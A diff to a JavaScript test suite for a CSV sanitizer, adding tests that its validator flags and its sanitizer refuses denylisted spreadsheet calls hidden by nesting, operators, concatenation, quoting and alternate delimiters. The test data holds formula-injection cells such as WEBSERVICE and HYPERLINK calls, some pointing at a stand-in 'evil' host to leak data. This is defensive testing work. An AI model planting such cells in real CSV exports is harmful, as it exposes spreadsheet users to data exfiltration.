@@ -885,6 +885,99 @@ function testGuardCsvAllowlistJudgesEveryCall() {
         '=IF(1,"safe",WEBSERVICE("http://evil/"))');
 }
 
+function testGuardCsvDenylistJudgesEveryCallInACell() {
+  // The denylist walk read the one word after the trigger, so a denylisted
+  // call reached by nesting, by an operator, by a parenthesis or by a
+  // concatenation validated clean and sanitize served it prefixed, which
+  // Excel drops on save and re-open.
+  function kinds(doc, opts) {
+    return b.guardCsv.validate(doc, opts || { profile: "strict" }).issues
+      .map(function (i) { return i.kind; });
+  }
+  [
+    "a\r\n=SUM(HYPERLINK(A1))\r\n",
+    'a\r\n=1+WEBSERVICE("http://x/")\r\n',
+    'a\r\n=(WEBSERVICE("http://x/"))\r\n',
+    'a\r\n="x"&WEBSERVICE("http://x/")\r\n',
+    'a\r\n= WEBSERVICE("http://x/")\r\n',
+    'a\r\n"=IF(1,""safe"",WEBSERVICE(""http://x/""))"\r\n',
+    'a\r\n"\'=SUM(HYPERLINK(A1))"\r\n',
+    "a\r\n\"\n\n'=SUM(HYPERLINK(A1))\"\r\n",
+    "a\r\n\"\t\"'=SUM(HYPERLINK(A1))\r\n",
+    "a;b\r\nsafe;=SUM(HYPERLINK(A1))\r\n",
+  ].forEach(function (doc) {
+    check("denylisted call anywhere in the cell is a finding " + JSON.stringify(doc),
+          kinds(doc).indexOf("dangerous-function") !== -1, JSON.stringify(kinds(doc)));
+    var threw = null;
+    try { b.guardCsv.sanitize(doc, { profile: "strict" }); } catch (e) { threw = e; }
+    check("sanitize refuses it " + JSON.stringify(doc),
+          threw !== null && threw.code === "csv.dangerous-function",
+          threw ? threw.code : "returned");
+  });
+  var once = b.guardCsv.validate("a\r\n=WEBSERVICE(HYPERLINK(A1))\r\n", { profile: "strict" })
+    .issues.filter(function (i) { return i.kind === "dangerous-function"; });
+  check("one cell is one dangerous-function finding", once.length === 1, String(once.length));
+  var split = b.guardCsv.validate("a\r\n=WEBSERVICE(A1,HYPERLINK(B1))\r\n", { profile: "strict" })
+    .issues.filter(function (i) { return i.kind === "dangerous-function"; });
+  check("a cell the comma reading splits is still one finding", split.length === 1, String(split.length));
+  // A name that begins after a digit is still read as a call. No evaluator
+  // runs `=1HYPERLINK(...)`, and the reading that refuses it costs no
+  // legitimate formula, so the walk stays on the refusing side.
+  [
+    "a\r\n=1HYPERLINK(A1)\r\n",
+    "a\r\n=SUM(0.HYPERLINK(A1))\r\n",
+    "a\r\n=SUM(A1,1WEBSERVICE(A1))\r\n",
+  ].forEach(function (doc) {
+    check("a denylisted name after a digit is a finding " + JSON.stringify(doc),
+          kinds(doc).indexOf("dangerous-function") !== -1, JSON.stringify(kinds(doc)));
+  });
+  // The same cell read under two delimiters can decode differently, so the
+  // walk keys a visit on what it read, not on where it started.
+  var junk = 'a|"\n"==xHYPERLINK(""HYPERLINK(""\r\n';
+  check("a cell that decodes differently per reading is judged under each",
+        kinds(junk).indexOf("dangerous-function") !== -1, JSON.stringify(kinds(junk)));
+  [
+    'a\r\n=SUM("HYPERLINK(")\r\n',
+    'a\r\n=SUM(1,"WEBSERVICE (x)")\r\n',
+    "a\r\n=SUM(A1:A5)\r\n",
+  ].forEach(function (doc) {
+    check("a denylisted name inside a string argument is text " + JSON.stringify(doc),
+          kinds(doc).indexOf("dangerous-function") === -1, JSON.stringify(kinds(doc)));
+  });
+}
+
+function testGuardCsvAllowlistResidualJudgesEveryCall() {
+  // Under `allowlist`, a formula cell that only another delimiter's reading
+  // exposes cannot be re-serialized away; the residual check exempted it on
+  // its leading call alone, so `=SUM(FOO(A1))` was served live to a
+  // semicolon reader with only SUM allowlisted.
+  var opts = { profile: "strict", formulaInjectionPolicy: "allowlist", formulasAllowlist: ["SUM"] };
+  var threw = null;
+  try { b.guardCsv.sanitize("h\r\nsafe;=SUM(FOO(A1))\r\n", opts); } catch (e) { threw = e; }
+  check("a residual formula with a call outside the allowlist is refused",
+        threw !== null && threw.code === "csv.formula-injection", threw ? threw.code : "returned");
+  var out = b.guardCsv.sanitize("h\r\nsafe;=SUM(A1)\r\n", opts);
+  check("a residual formula whose every call is allowlisted is served",
+        out.indexOf("=SUM(A1)") !== -1, JSON.stringify(out));
+  var served = b.guardCsv.sanitize("h\r\nsafe,=SUM(FOO(A1))\r\n", opts);
+  check("under the emitted dialect the same cell is prefixed instead",
+        served.indexOf("'=SUM(FOO(A1))") !== -1, JSON.stringify(served));
+}
+
+function testGuardCsvAmplificationCapCoversTheDisarmedOutput() {
+  // The cap was measured on the character-stripped text, before the formula
+  // re-serialization that quotes every cell, so an operator cap of 1 let an
+  // 8-character document come back 18 characters long.
+  var threw = null;
+  try { b.guardCsv.sanitize("a,b\n=1,2", { profile: "strict", sanitizeAmplificationCap: 1 }); }
+  catch (e) { threw = e; }
+  check("the cap is measured on the served output",
+        threw !== null && threw.code === "csv/sanitize-amplified", threw ? threw.code : "returned");
+  var out = b.guardCsv.sanitize("a,b\n=1,2", { profile: "strict", sanitizeAmplificationCap: 3 });
+  check("under a cap the re-serialization fits, the disarmed document is served",
+        out.indexOf("'=1") !== -1, JSON.stringify(out));
+}
+
 function testGuardCsvDangerousFunctionDeny() {
   var rv = b.guardCsv.validate(
     "a,b\r\nuser,=HYPERLINK(\"http://evil/leak\",\"x\")",
@@ -1751,6 +1844,9 @@ async function run() {
   testGuardCsvFullWidthFormulaPrefix();
   await testGuardCsvFormulaBehindEmptyQuotedSection();
   testGuardCsvAllowlistJudgesEveryCall();
+  testGuardCsvDenylistJudgesEveryCallInACell();
+  testGuardCsvAllowlistResidualJudgesEveryCall();
+  testGuardCsvAmplificationCapCoversTheDisarmedOutput();
   testGuardCsvDangerousFunctionDeny();
   testGuardCsvFormulaInjectionReject();
   testGuardCsvFormulaInjectionEveryPrefix();
